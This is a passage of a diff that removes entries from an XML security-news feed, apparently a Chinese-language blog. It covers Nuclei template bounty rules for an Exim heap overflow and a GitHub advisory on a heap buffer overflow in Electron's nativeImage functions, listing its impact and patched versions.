data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Exim Heap Buffer Overflow Vulnerability</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Electron vulnerable to Heap Buffer Overflow in NativeImage</title>
-    <link href="http://example.com/2025/06/30/github_1827877997/"/>
-    <id>http://example.com/2025/06/30/github_1827877997/</id>
-    <published>2025-06-30T19:00:04.808Z</published>
-    <updated>2025-06-30T19:00:04.808Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-6r2x-8pq8-9489">https://github.com/advisories/GHSA-6r2x-8pq8-9489</a></p><p><strong>仓库 Star：</strong> 117292</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/electron/electron/security/advisories/GHSA-6r2x-8pq8-9489">https://github.com/electron/electron/security/advisories/GHSA-6r2x-8pq8-9489</a></p></li><li><p><a href="https://github.com/advisories/GHSA-6r2x-8pq8-9489">https://github.com/advisories/GHSA-6r2x-8pq8-9489</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>The <code>nativeImage.createFromPath()</code> and <code>nativeImage.createFromBuffer()</code> functions call a function downstream that is vulnerable to a heap buffer overflow. An Electron program that uses either of the affected functions is vulnerable to a buffer overflow if an attacker is in control of the image’s height, width, and contents.</p><h3 id="Workaround"><a href="#Workaround" class="headerlink" title="Workaround"></a>Workaround</h3><p>There are no app-side workarounds for this issue. You must update your Electron version to be protected.</p><h3 id="Patches"><a href="#Patches" class="headerlink" title="Patches"></a>Patches</h3><ul><li><code>v28.3.2</code></li><li><code>v29.3.3</code></li><li><code>v30.0.3</code></li></ul><h3 id="For-More-Information"><a href="#For-More-Information" class="headerlink" title="For More Information"></a>For More Information</h3><p>If you have any questions or comments about this advisory, email us at <a href="mailto:&#x73;&#101;&#99;&#117;&#x72;&#105;&#116;&#121;&#x40;&#101;&#x6c;&#101;&#99;&#116;&#x72;&#x6f;&#x6e;&#x6a;&#x73;&#46;&#x6f;&#114;&#x67;">security@electronjs.org</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-6r2x-8pq8-9489&quot;&gt;https://github.com/advisories/GHSA-6r2x-8pq8-9489&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
     
   </entry>
   
